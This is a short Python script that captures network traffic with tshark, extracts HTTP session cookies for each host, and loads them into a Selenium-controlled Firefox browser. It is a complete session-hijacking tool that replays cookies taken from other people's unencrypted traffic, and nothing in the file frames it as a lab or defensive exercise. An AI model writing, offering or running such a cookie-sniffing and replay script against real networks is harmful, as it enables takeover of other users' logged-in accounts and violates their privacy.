import os
from selenium import webdriver

os.system('tshark -a duration:10 -w packs.psap')
os.system('tshark -r ./packs.psap -T fields -e http.host -e http.cookie -Y http.cookie > cookies.txt')
cookiesFile = open('cookies.txt','r')
cookiesDict = dict()
driver = webdriver.Firefox(executable_path='/usr/local/bin/geckodriver')

for line in cookiesFile:
	line = line.replace(";","")
	line = line.split()
	host = 'http://' + line[0] 
	cookies = line[1:]
	if host not in cookiesDict:
		cookiesDict[host] = dict()
	for cookie in cookies:
		cookie = cookie.split("=")
		cookiesDict[host][cookie[0]] = cookie[1]

print(cookiesDict)
for host in cookiesDict:
	driver.get(host)
	for cookieKey in cookiesDict[host]:		
		cookie = dict()
		cookie['name'] = cookieKey
		cookie['value'] = cookiesDict[host][cookieKey]
		cookie['path'] = "/"
		driver.add_cookie(cookie)			

